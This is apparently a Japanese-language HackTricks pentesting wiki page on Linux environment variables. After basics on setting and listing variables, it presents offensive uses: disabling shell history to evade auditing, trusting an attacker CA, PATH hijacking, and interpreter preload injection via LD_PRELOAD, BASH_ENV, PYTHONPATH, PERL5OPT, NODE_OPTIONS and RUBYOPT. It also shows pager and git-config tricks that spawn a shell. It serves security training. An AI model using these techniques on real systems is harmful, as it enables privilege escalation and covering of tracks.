# Linux 環境変数

{{#include ../../banners/hacktricks-training.md}}

## グローバル変数

グローバル変数は**子プロセス**に継承されます。

次のコマンドを実行すると、現在のセッション用のグローバル変数を作成できます。
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
この変数は、現在のセッションおよびその子プロセスからアクセス可能です。

**変数を削除**するには、次の操作を行います:
```bash
unset MYGLOBAL
```
## Local variables

**local variables** は、**current shell/script** からのみ **accessed** できます。
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## 現在の変数を一覧表示
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
`/proc/*/environ` の内容は **NUL-separated** なので、通常は次のバリアントのほうが読みやすくなります:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
**credentials** または継承された環境内の**興味深いサービス設定**を探している場合は、[Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) も確認してください。

## 一般的な変数

From: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/)

- **DISPLAY** – **X** が使用するディスプレイ。この変数は通常 **:0.0** に設定されます。これは、現在のコンピューター上の最初のディスプレイを意味します。
- **EDITOR** – ユーザーが優先するテキストエディター。
- **HISTFILESIZE** – history file に含める最大行数。
- **HISTSIZE** – ユーザーがセッションを終了したときに history file に追加される行数。
- **HOME** – ホームディレクトリ。
- **HOSTNAME** – コンピューターのホスト名。
- **LANG** – 現在の言語。
- **MAIL** – ユーザーの mail spool の場所。通常は **/var/spool/mail/USER**。
- **MANPATH** – manual pages を検索するディレクトリのリスト。
- **OSTYPE** – オペレーティングシステムの種類。
- **PS1** – bash のデフォルトプロンプト。
- **PATH** – 相対パスや絶対パスを指定せず、ファイル名だけを指定して実行したい binary files を保持するすべてのディレクトリのパス。
- **PWD** – 現在の作業ディレクトリ。
- **SHELL** – 現在の command shell へのパス（例：**/bin/bash**）。
- **TERM** – 現在の terminal type（例：**xterm**）。
- **TZ** – タイムゾーン。
- **USER** – 現在のユーザー名。

## hacking に役立つ変数

すべての変数が同じように役立つわけではありません。offensive の観点では、**search paths**、**startup files**、**dynamic linker の動作**、または**audit/logging**を変更する変数を優先してください。

### **HISTFILESIZE**

**この変数の値を 0 に変更**すると、**セッションを終了したとき**に **history file** (\~/.bash_history) が**0 行に切り詰められます**。
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

**この変数の値を 0 に変更**すると、コマンドが**メモリ上の履歴に保持されなくなり**、**履歴ファイル**（\~/.bash_history）に書き戻されなくなります。
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

**この変数の値が `ignorespace` または `ignoreboth` に設定されている場合**、先頭に余分なスペースを付けたコマンドは履歴に保存されません。
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

**history file** を **`/dev/null`** に指定するか、完全に unset します。これは通常、history size だけを変更するよりも信頼性が高くなります。
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

プロセスは、**proxy** としてここで宣言された設定を使用し、**http または https** 経由でインターネットに接続します。
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy & no_proxy

- `all_proxy`: これを使用する tools/protocols のデフォルト proxy。
- `no_proxy`: 直接接続すべき対象（hosts/domains/CIDRs）の bypass list。
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
ツールに応じて、小文字と大文字のバリアント（`http_proxy`/`HTTP_PROXY`、`no_proxy`/`NO_PROXY`）が使用される場合があります。

### SSL_CERT_FILE & SSL_CERT_DIR

プロセスは、**これらの環境変数**で指定された証明書を信頼します。これは、**`curl`**、**`git`**、Python HTTP クライアント、パッケージマネージャーなどのツールに、攻撃者が管理する CA を信頼させるのに役立ちます（例えば、interception proxy を正規のものに見せかける場合など）。
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

特権ラッパー/スクリプトが**絶対パスを指定せずに**コマンドを実行する場合、`PATH` 内で攻撃者が制御できる最初のディレクトリが優先されます。これは、`sudo`、cron ジョブ、シェルラッパー、カスタム SUID ヘルパーにおける多くの **PATH hijacks** の基盤となる仕組みです。`env_keep+=PATH`、脆弱な `secure_path`、または `tar`、`service`、`cp`、`python` などを名前だけで呼び出すラッパーを探してください。
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
`PATH`を悪用した完全なprivilege-escalation chainについては、[Linux Privilege Escalation](linux-privilege-escalation/README.md)を確認してください。

### **HOME & XDG_CONFIG_HOME**

`HOME`は単なるディレクトリ参照ではありません。多くのツールは、`$HOME`または`$XDG_CONFIG_HOME`から**dotfiles**、**plugins**、**per-user configuration**を自動的に読み込みます。privileged workflowがこれらの値を保持している場合、**config injection**はbinary hijackingよりも容易になる可能性があります。
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
対象として興味深いものには、`.gitconfig`、`.wgetrc`、`.curlrc`、`.inputrc`、`.pythonrc.py`、および `.terraformrc` などのツール固有のファイルがあります。

### **LD_PRELOAD、LD_LIBRARY_PATH、LD_AUDIT**

これらの変数は **dynamic linker** に影響を与えます。

- `LD_PRELOAD`: 追加の shared objects を最初にロードするよう強制します。
- `LD_LIBRARY_PATH`: library の検索ディレクトリを先頭に追加します。
- `LD_AUDIT`: library のロードと symbol resolution を監視する auditor libraries をロードします。

特権コマンドがこれらを保持する場合、**hooking**、**instrumentation**、**privilege escalation** に非常に役立ちます。**secure-execution** モード（`AT_SECURE`、例: setuid/setgid/capabilities）では、loader がこれらの変数の多くを削除または制限します。ただし、この初期の loader stage にある parser bugs は、対象プログラムよりも**前に**実行されるため、依然として影響が大きくなります。
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES`は、glibcの初期動作（allocatorのtunableなど）を変更し、exploit labで非常に便利です。また、**dynamic loaderが非常に早い段階で解析する**ため、securityの観点でも重要です。2023年の**Looney Tunables** bugは、loaderで解析される単一の環境変数が、SUID programに対する**local privilege-escalation primitive**になり得ることを改めて示すものでした。
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

**Bash** が **non-interactively** 起動された場合、対象スクリプトを実行する前に `BASH_ENV` を確認し、そのファイルを source します。Bash が `sh` として呼び出された場合、または POSIX-style の interactive mode では、`ENV` も参照されることがあります。これは、環境が attacker-controlled である場合に、シェルラッパーをコード実行へ変える古典的な手法です。
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash 自体は、`-p` が使用されない限り、**real/effective IDs differ** の場合にこれらの startup files を無効化します。そのため、正確な挙動は wrapper が shell をどのように起動するかによって異なります。Bash を起動する**前**に `setuid()`/`setgid()` を呼び出す privileged wrapper には注意してください。ID が再び一致すると、Bash は通常なら無視する `BASH_ENV`、`ENV`、および関連する shell state を信頼する可能性があります。

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP & PYTHONINSPECT**

これらの variables は Python の起動方法を変更します。

- `PYTHONPATH`: import search paths を先頭に追加します。
- `PYTHONHOME`: standard library tree の場所を変更します。
- `PYTHONSTARTUP`: interactive prompt の前に file を実行します。
- `PYTHONINSPECT=1`: script の終了後に interactive mode に入ります。

これらは、制御可能な environment で Python を呼び出す maintenance scripts、debuggers、shells、wrappers に対して有用です。`python -E` と `python -I` はすべての `PYTHON*` variables を無視します。
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode
```
最近の実環境での例として、Ubuntu/Debian システムにおける 2024 年の **needrestart** LPE があります。root 所有の scanner が `/proc/<PID>/environ` から非特権プロセスの `PYTHONPATH` をコピーし、その後 Python を実行していました。公開された exploit は、攻撃者が制御する path に `importlib/__init__.so` を配置したため、helper にハードコードされた script が問題になる前に、Python 自身の初期化中に攻撃者の code が実行されました。

### **PERL5OPT & PERL5LIB**

Perl にも同様に有用な startup variable があります。

- `PERL5LIB`: library directory を prepend する。
- `PERL5OPT`: すべての `perl` command line に指定されているかのように switch を inject する。

これにより、target script が重要な処理を開始する前に **automatic module loading** を強制したり、interpreter の動作を変更したりできます。Perl は **taint / setuid / setgid** context ではこれらの variable を無視しますが、通常の root-run wrapper、CI job、installer、カスタム sudoers rule では依然として非常に重要です。
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS` は、環境を継承するすべての `node` process に **Node.js CLI flags** を追加します。そのため、最終的に Node を呼び出す wrappers、CI jobs、Electron helpers、sudo rules に対して有用です。攻撃で特に興味深い flags は通常、次のとおりです。

- `--require <file>`: target script の前に CommonJS file を preload します。
- `--import <module>`: target script の前に ES module を preload します。

Node は `NODE_OPTIONS` 内の一部の危険な flags を拒否しますが、`--require` と `--import` は明示的に許可されており、通常の command-line arguments より**前に**処理されます。
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
間接的に `NODE_OPTIONS` を設定する remote gadget chains（例: prototype-pollution から RCE への移行）については、[こちらの別ページ](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md)を確認してください。

### **RUBYLIB & RUBYOPT**

Ruby でも同様の起動時悪用が可能です。

- `RUBYLIB`: Ruby の load path の先頭にディレクトリを追加します。
- `RUBYOPT`: すべての `ruby` invocation に `-r` などのコマンドラインオプションを注入します。
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
2024年の **needrestart** の脆弱性は、これが単なる lab trick ではないことを示しました。`PYTHONPATH` abuse に対して脆弱だったのと同じ root-owned helper を、attacker-controlled な `RUBYLIB` で Ruby を実行するよう強制し、attacker directory から `enc/encdb.so` を読み込ませることも可能でした。

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

一部のツールは、環境変数から path を読み取るだけではなく、その値を **shell**、**editor**、または **input preprocessor** に渡します。そのため、privileged wrapper が `git`、`man`、`less`、または同様の text viewer を実行する場合、以下の変数は特に興味深いものになります。

- `PAGER`、`MANPAGER`、`GIT_PAGER`: pager command を選択します。
- `GIT_EDITOR`、`VISUAL`、`EDITOR`: editor command を選択します。多くの場合、arguments も指定できます。
- `LESSOPEN`、`LESSCLOSE`: `less` が file を開く際に実行する pre/post-processors を定義します。
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git は、`GIT_CONFIG_COUNT`、`GIT_CONFIG_KEY_<n>`、`GIT_CONFIG_VALUE_<n>`を使用して、ディスクに触れることなく **env-only config injection** もサポートしています：
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
ポストエクスプロイテーションの観点でも、継承された環境には **credentials**、**proxy settings**、**service tokens**、または **cloud keys** が含まれていることが多い点を覚えておいてください。[Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) で、`/proc/<PID>/environ` と `systemd` の `Environment=` の探索を確認してください。

### PS1

プロンプトの表示を変更します。

[**これは例です**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: これは例です](<../images/image (897).png>)

一般ユーザー:

![PERL5OPT & PERL5LIB - PS1: バックグラウンドで実行中のジョブが1つ、2つ、3つ](<../images/image (740).png>)

バックグラウンドで実行中のジョブが1つ、2つ、3つ:

![PERL5OPT & PERL5LIB - PS1: バックグラウンドで実行中のジョブが1つ、2つ、3つ](<../images/image (145).png>)

バックグラウンドジョブが1つ、停止中のジョブが1つあり、最後のコマンドが正常に終了しなかった場合:

![PERL5OPT & PERL5LIB - PS1: バックグラウンドジョブが1つ、停止中のジョブが1つあり、最後のコマンドが正常に終了しなかった場合](<../images/image (715).png>)

## References

- [GNU Bash Manual - Bash Startup Files](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [Qualys - LPEs in needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [Node.js CLI documentation - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)

{{#include ../../banners/hacktricks-training.md}}
